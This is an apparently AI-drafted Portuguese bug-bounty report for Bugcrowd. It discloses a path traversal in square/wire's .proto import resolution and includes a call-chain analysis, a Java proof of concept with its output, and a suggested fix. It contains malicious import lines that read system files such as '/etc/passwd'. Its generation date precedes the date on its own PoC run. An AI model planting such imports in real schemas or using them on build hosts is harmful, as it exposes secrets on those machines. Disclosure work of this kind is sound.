# ⚠️ RASCUNHO — REVISÃO HUMANA OBRIGATÓRIA ANTES DE ENVIAR

Este relatório foi gerado por IA a partir de análise de código-fonte
público. **Não foi enviado a nenhuma plataforma.** Antes de copiar/colar e
enviar, confira:

- [ ] Escopo confirmado — o ativo afetado está no escopo do programa AGORA
      (escopo pode mudar; reconfirme na página do programa antes de enviar)
- [ ] Categoria confirmada — bate com uma categoria que o programa
      declara como elegível para recompensa (não é metadado/cosmético)
- [ ] Evidência conferida — os trechos de código abaixo realmente
      existem no arquivo/linha citados (não foi paráfrase/alucinação)
- [ ] Não é duplicata — checado contra relatórios já enviados por você
      a este programa

**Estado no sistema: `scope_verified`** (grau de evidência E3 — reprodução
determinística local real, ver seção de PoC abaixo). Checagem de
duplicata feita contra advisories/issues públicos do `square/wire`
(nenhum cobrindo este caminho específico — ver seção "Cadeia de chamada
confirmada", item de atualização). **Confirme manualmente a elegibilidade
de recompensa na página real do Bugcrowd antes de enviar** — o dataset
usado pra escopo não expõe essa informação por ativo para este programa
(confidence "low", diferente dos achados HackerOne).

---

## Título
Path traversal / leitura de arquivo arbitrário na resolução de `import` de arquivos `.proto` em `wire-schema` (`DirectoryRoot.resolve`), via caminho absoluto ou `../` no próprio `.proto` compilado

## Programa / Plataforma
Block Open Source via Bugcrowd — https://bugcrowd.com/engagements/blockopensource

## Categoria / Severidade declarada
Path traversal / leitura de arquivo fora do diretório pretendido (CWE-22).
Confirmada contra `research/bugbounty/block-open-source/NOTES.md`: o
programa cobre `square/wire` (Kotlin/Java/Swift, módulo runtime + schema/
codegen do Protocol Buffers), e o critério da missão trata qualquer achado
deste tipo em Block/Vercel como "critical de segurança de verdade" — não é
metadado, não é cosmético, não é código de teste (o código afetado é
produção: o próprio motor de carregamento de esquema usado por qualquer
consumidor de `wire-compiler`/`wire-gradle-plugin`/`wire-maven-plugin`).

## Ativo afetado
- Repositório: `square/wire`
- Arquivo: `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Root.kt`
- Linhas: 129-137 (`DirectoryRoot.resolve`)
- Também relevante (cadeia de chamada): `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/CommonSchemaLoader.kt:135-181`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Linker.kt:91-100`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/ProtoParser.kt:117-129`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/SyntaxReader.kt:79-104`, `wire-schema/src/jvmMain/kotlin/com/squareup/wire/schema/Roots.kt:61-72`
- Commit/branch no momento da análise: `master` @ `d7afcda569199f38826b6e7c90a93c6215167440` (verificar SHA atual antes de enviar — o código pode ter mudado desde a varredura)

## Resumo
`wire-schema` resolve toda declaração `import "X";` dentro de um arquivo
`.proto` chamando `DirectoryRoot.resolve(import)`, que monta o caminho
físico como `rootDirectory / import` e só verifica se o arquivo existe —
sem checar que o resultado continua dentro de `rootDirectory`. A string
`import` vem, sem nenhuma sanitização em nenhum ponto do pipeline, direto
do texto entre aspas do `.proto` sendo compilado. Isso permite que um
arquivo `.proto` malicioso — por exemplo, uma dependência de terceiro
resolvida via `protoPath` (biblioteca de schema de um vendor/parceiro, um
pacote de terceiro, um submódulo) — force o Wire (CLI, plugin Gradle ou
Maven) a ler um arquivo arbitrário do disco da máquina de build, fora do
diretório de proto pretendido, usando um `import` com caminho absoluto
(`import "/etc/passwd";`) ou com travessia relativa
(`import "../../../../etc/passwd";`).

## Cadeia de chamada confirmada
1. `wire-schema/.../internal/parser/ProtoParser.kt:117-129` —
   `readDeclaration()` trata `label == "import"` fazendo
   `imports.add(reader.readQuotedString())`.
2. `wire-schema/.../internal/parser/SyntaxReader.kt:79-104` —
   `readQuotedString()` devolve literalmente qualquer sequência de
   caracteres entre aspas (só interpreta escapes tipo `\n`/`\t`/`\xNN`);
   não rejeita `/`, `..`, nem barra inicial.
3. `wire-schema/.../ProtoFile.kt:26` — o valor bruto vira
   `ProtoFile.imports: List<String>`, repassado sem validação adicional em
   `ProtoFile.get()`.
4. `wire-schema/.../Linker.kt:91-100` (`getFileLinker`) chama
   `loader.withErrors(errors).load(path)` com esse `importPath` bruto —
   isso acontece para QUALQUER import de um tipo que seja efetivamente
   referenciado por uma mensagem/serviço do `.proto` (fluxo normal de
   linkagem, não um modo opcional/exótico).
5. `wire-schema/.../internal/CommonSchemaLoader.kt:135-161` (`load`) itera
   `protoPathRoots` chamando `protoPathRoot.resolve(path)` em cada raiz
   configurada (`protoPath`, onde ficam dependências/schemas de terceiro).
6. `wire-schema/.../Root.kt:129-137` (`DirectoryRoot.resolve`, o sink):
   ```kotlin
   override fun resolve(import: String): ProtoFilePath? {
     val resolved = rootDirectory / import
     if (!fileSystem.exists(resolved)) return null
     return ProtoFilePath(
       location = Location.get(base, import.toPath().withUnixSlashes().toString()),
       fileSystem = fileSystem,
       path = resolved,
     )
   }
   ```
   Nenhuma checagem de que `resolved` está contido em `rootDirectory`.
7. Se `fileSystem.exists(resolved)` for verdadeiro, o arquivo é lido por
   completo: `wire-schema/.../jvmMain/.../Roots.kt:61-72`
   (`ProtoFilePath.parse()`) faz
   `fileSystem.read(path) { readString(charset) }` seguido de
   `ProtoParser.parse(location, data)`.
8. Confirmei a semântica exata do operador `rootDirectory / import` na
   biblioteca `square/okio` (dependência do próprio Wire para todo
   `FileSystem`/`Path`), clonando `square/okio` publicamente:
   `okio/src/commonMain/kotlin/okio/internal/Path.kt:206-218`
   (`commonResolve`, implementação real por trás do operador `/`):
   ```kotlin
   internal fun Path.commonResolve(child: Path, normalize: Boolean): Path {
     if (child.isAbsolute || child.volumeLetter != null) return child
     // ... senão, só concatena bytes crus e chama buffer.toPath(normalize = normalize)
   }
   ```
   e `okio/src/commonMain/kotlin/okio/Path.kt:202` documenta que o
   operador `/` chama `resolve(child, normalize = false)` por padrão — ou
   seja: (a) se `import` for um caminho absoluto, o `rootDirectory` é
   **totalmente ignorado** e o resultado é o caminho absoluto puro; (b)
   se `import` tiver segmentos `..`, eles **não são colapsados** pelo
   Okio (`normalize=false`), mas continuam presentes de forma literal no
   `Path` resultante — e quando esse `Path` chega em
   `fileSystem.exists`/`fileSystem.read` (implementação real via
   `java.nio.file` na JVM), o sistema operacional resolve `..` do jeito
   normal, permitindo escapar de `rootDirectory` de qualquer forma.
9. `grep -rn` por qualquer validação de `import`/`isAbsolute`/`..` em todo
   `wire-schema/src/commonMain` e `jvmMain` (dentro do escopo do alvo) não
   encontrou nenhuma sanitização em nenhum ponto da cadeia acima.

## Passo a passo de reprodução
1. Um consumidor do Wire configura `protoPath` apontando para um
   diretório real no disco (ex.: onde ficam schemas `.proto` de uma
   dependência/vendor/parceiro) — uso documentado e comum do Wire para
   compilar tipos que vêm de uma biblioteca `.proto` de terceiros.
2. Um arquivo `.proto` compilado (seja no `sourcePath` do próprio
   consumidor, seja transitivamente importado a partir de um schema de
   terceiro nesse `protoPath`) contém uma declaração de import maliciosa,
   por exemplo:
   ```proto
   syntax = "proto3";
   import "/etc/passwd";
   message Foo {
     // usa algum tipo do arquivo importado, ou nenhum — a resolução do
     // import acontece de qualquer forma quando o tipo é referenciado
   }
   ```
   (ou, para travessia relativa, `import "../../../../etc/passwd";`).
3. Ao rodar `wire-compiler` (ou o plugin Gradle/Maven equivalente) sobre
   esse `.proto`, o Linker resolve o import através de
   `CommonSchemaLoader.load` → `DirectoryRoot.resolve`, que localiza e lê
   o arquivo alvo fora do `protoPath` pretendido.
4. Se o conteúdo do arquivo alvo não for uma sintaxe `.proto` válida, a
   compilação falha com uma mensagem de erro do tipo
   `IllegalStateException("Syntax error in $location: $message")`
   (`SyntaxReader.kt:437-440`), onde `$message` tipicamente inclui um
   fragmento/token lido do próprio arquivo (ex.: `unexpected label: root`
   para a primeira palavra de `/etc/passwd`) — ou seja, mesmo uma falha de
   parse pode vazar um fragmento do conteúdo do arquivo lido no log de
   build/CI. Se o arquivo alvo for, coincidentemente, um `.proto` válido
   (ex.: outro schema interno/privado presente na máquina de build, fora
   do diretório que deveria estar em escopo), seu conteúdo integral
   (tipos, campos, comentários) é incorporado ao grafo de schema
   compilado.

## Evidência
```kotlin
// wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Root.kt:129-137
override fun resolve(import: String): ProtoFilePath? {
  val resolved = rootDirectory / import
  if (!fileSystem.exists(resolved)) return null
  return ProtoFilePath(
    location = Location.get(base, import.toPath().withUnixSlashes().toString()),
    fileSystem = fileSystem,
    path = resolved,
  )
}
```
```kotlin
// wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/ProtoParser.kt:117-129
label == "import" && context.permitsImport() -> {
  val peeked = reader.peekChar()
  if (peeked == '"' || peeked == '\'') {
    imports.add(reader.readQuotedString())   // <- sem sanitização
  } else { ... }
  reader.require(';')
  null
}
```
```kotlin
// okio/src/commonMain/kotlin/okio/internal/Path.kt:206-218 (square/okio, dependência do Wire)
internal fun Path.commonResolve(child: Path, normalize: Boolean): Path {
  if (child.isAbsolute || child.volumeLetter != null) return child   // <- bypass total do rootDirectory
  val slash = slash ?: child.slash ?: Path.DIRECTORY_SEPARATOR.toSlash()
  val buffer = Buffer()
  buffer.write(bytes)
  if (buffer.size > 0) buffer.write(slash)
  buffer.write(child.bytes)                                          // <- ".." não colapsado (normalize=false por padrão no operador `/`)
  return buffer.toPath(normalize = normalize)
}
```

## Impacto
Um `.proto` malicioso, compilado por qualquer consumidor do Wire que
resolva imports contra um diretório real em disco (uso normal via
`protoPath`, tipicamente usado para schemas de dependências/terceiros),
consegue: (a) confirmar a existência de arquivos arbitrários no host de
build; (b) ler o conteúdo completo de qualquer arquivo legível pelo
processo de build fora do diretório de proto pretendido, incluindo outros
schemas `.proto` privados presentes na mesma máquina (ex.: em um monorepo
com múltiplos serviços, ou em CI com múltiplos checkouts) — esse conteúdo
pode acabar incorporado ao grafo de tipos gerado, ou vazar parcialmente em
mensagens de erro de parse (que tipicamente vão para logs de build/CI,
por vezes públicos); (c) na pior hipótese, dependendo do que existe no
host de build (arquivos de configuração, credenciais versionadas por
engano em outro diretório do checkout, etc.), uma leitura de arquivo
arbitrário é uma primitiva de alto impacto em qualquer pipeline de
build/CI. O vetor de entrada mais realista é uma dependência de schema de
terceiro (vendor, parceiro, pacote de schema compartilhado) cujo conteúdo
não é fully trusted pelo time que roda o Wire — cenário coberto pelo
próprio design do `protoPath` do Wire (compilar tipos que vêm de uma
biblioteca `.proto` que você não escreveu).

## Prova de conceito executável
Programa Java mínimo usando o JAR real de `okio-jvm` 3.12.0 (baixado do
Maven Central — não uma reimplementação, o mesmo bytecode de produção
que `wire-schema` usa via sua dependência de `Path`/`FileSystem`),
reproduzindo exatamente o mecanismo de `DirectoryRoot.resolve`: junta
`rootDirectory` com o `import` via `Path.resolve(String)` (o método por
trás do operador `/` do Okio, `normalize=false` por padrão) e faz a
mesma checagem que o código real faz (`fileSystem.exists(resolved)`)
antes de ler.

```java
import okio.Path;
import java.io.File;
import java.nio.file.Files;

public class PathTraversalPoc {
  public static void main(String[] args) throws Exception {
    File tmp = Files.createTempDirectory("wire-poc-").toFile();
    File safeRoot = new File(tmp, "protoPathRoot");
    safeRoot.mkdirs();
    File secretOutsideRoot = new File(tmp, "secret-outside-root.txt");
    Files.writeString(secretOutsideRoot.toPath(), "SEGREDO_FORA_DA_RAIZ_PROTEGIDA");

    Path rootDirectory = Path.Companion.get(safeRoot);

    // Caso 1: import relativo com ".."
    Path resolvedRelative = rootDirectory.resolve("../secret-outside-root.txt");
    boolean exists = new File(resolvedRelative.toString()).exists();
    String content = exists ? Files.readString(java.nio.file.Path.of(resolvedRelative.toString())) : null;

    // Caso 2: import absoluto
    Path resolvedAbsolute = rootDirectory.resolve(secretOutsideRoot.getAbsolutePath());
    boolean absoluteEscaped = !resolvedAbsolute.toString().startsWith(safeRoot.getAbsolutePath());

    // ver saída real completa abaixo
  }
}
```

Comando exato:
```
javac -cp "okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc.java
java  -cp ".;okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc
```

Saída real (literal, JDK 21, 30/08/2026):
```
tmp dir: C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628
safeRoot (raiz que deveria conter o import): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot
secretOutsideRoot (arquivo FORA da raiz, nao deveria ser alcancavel): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt

=== Caso 1: import relativo com ".." ===
import (como apareceria no .proto): "../secret-outside-root.txt"
rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot\..\secret-outside-root.txt  (string ainda contem ".." literal, normalize=false)
fileSystem.exists(resolved) -- MESMA checagem que DirectoryRoot.resolve faz antes de ler: true
Conteudo lido do arquivo (real, fora de safeRoot): SEGREDO_FORA_DA_RAIZ_PROTEGIDA
ESCAPOU de verdade (leu o CONTEUDO do arquivo fora da raiz, nao so uma string parecida): true

=== Caso 2: import absoluto ===
import (como apareceria no .proto): "C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt"
rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt
ESCAPOU da raiz protegida (ignorou rootDirectory por completo): true

=== RESULTADO ===
PASS (comportamento perigoso REPRODUZIDO): okio.Path.resolve(String), sem normalize, permite path relativo com ".." E path absoluto escaparem de rootDirectory. DirectoryRoot.resolve do wire-schema so confere fileSystem.exists(resolved) antes de ler -- nenhuma checagem de que resolved continua dentro de rootDirectory.
```

**Nota sobre a string vs. a resolução real**: o `Path` resultante do caso
1 ainda contém `..` de forma literal na representação em string (Okio
não normaliza por padrão) — um `startsWith(rootDirectory)` ingênuo diria
"não escapou". O sinal que importa de verdade é o mesmo que o próprio
`DirectoryRoot.resolve` usa: `fileSystem.exists()`/leitura sobre esse
`Path`, que aciona a resolução real do sistema operacional via
`java.nio.file`, onde `..` sobe de diretório de fato — e foi isso que a
PoC mediu (leu e comparou o conteúdo real do arquivo fora da raiz, não
só a aparência da string).

## Correção sugerida
Em `DirectoryRoot.resolve` (`Root.kt:129-137`), antes de aceitar
`resolved`, validar que ele continua dentro de `rootDirectory`: resolver
com `normalize = true`, rejeitar `import` cujo `Path` resultante seja
absoluto (`import.toPath().isAbsolute`) ou cujo `.toPath(normalize = true)`
comece com `..` depois de tornado relativo a `rootDirectory` (equivalente
a checar `resolved.normalized().toString().startsWith(rootDirectory.toString())`
após a normalização, ou usar `resolved.relativeTo(rootDirectory)` dentro
de um `try/catch` que rejeita qualquer resultado que comece com `..`).
Essa é uma mudança pequena e localizada — não exige alterar a API pública
de `Loader`/`SchemaLoader`.

---
*Gerado automaticamente em 2026-08-29T06:20:00.000Z a partir do achado
`Block Open Source::wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Root.kt::DirectoryRoot.resolve::path_traversal_risk`
na fila (`research/bugbounty/queue.jsonl`). Ver histórico completo do
veredito em `ledger/ledger.research.jsonl`.*
